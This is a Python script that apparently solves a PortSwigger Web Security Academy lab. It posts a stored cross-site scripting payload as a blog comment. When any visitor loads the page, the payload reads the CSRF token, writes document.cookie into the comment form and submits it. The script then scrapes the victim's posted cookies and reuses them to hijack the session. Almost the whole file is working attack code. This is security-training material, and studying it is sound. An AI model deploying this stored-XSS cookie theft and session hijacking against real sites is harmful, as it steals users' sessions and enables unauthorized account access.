import requests
import sys
from bs4 import BeautifulSoup
import re
import time
site = 'ac481f1d1f9d74c5c0d4c61800bd002e.web-security-academy.net'
s = requests.Session()
post_url = f'https://{site}/post?postId=1'
resp = s.get(post_url)
soup = BeautifulSoup(resp.text,'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')

# Need to register an event handler to ensure form element that contains csrf token is loaded
#   and accessible.  Then, need to pull it in to the form on the page before submitting it
#   Any visitor will execute script when visiting page
comment_url = f'https://{site}/post/comment'
comment_xss = ''''<script>                                
  document.addEventListener("DOMContentLoaded", function() {                  
    document.forms[0].name.value = 'matt adler';
    document.forms[0].email.value = 'madler@pdx.edu';
    document.forms[0].postId.value = 1;
    document.forms[0].csrf.value = document.getElementsByName('csrf')[0].value;
    document.forms[0].comment.value = document.cookie;
    document.forms[0].website.value = 'https://foo.com';
    document.forms[0].submit();
  });                                                                             
</script>'''
comment_data = {
    'csrf' : csrf,
    'postId' : '2',
    'comment' : comment_xss,
    'name' : 'MattAdler',
    'email' : 'madler@.edu',
    'website': 'https://pdx.edu'
}
resp = s.post(comment_url, data=comment_data)

#input("Visit page in a browser and hit stop quickly.  See your own cookie and perhaps the victim cookie")

# Get page and parse out victim cookie.  Then use it to access main page
resp = s.get(post_url)
soup = BeautifulSoup(resp.text,'html.parser')
cookie_array = soup.find('p', text=re.compile('secret')).text.split(';')
cookie_dict = dict()
for cookie in cookie_array:
    c = cookie.split('=')
    cookie_dict[c[0]] = c[1]
print(f'Cookies parsed from page {cookie_dict}')
#input('Fetch site using cookies to solve')
resp = s.get(f'https://{site}',cookies=cookie_dict)
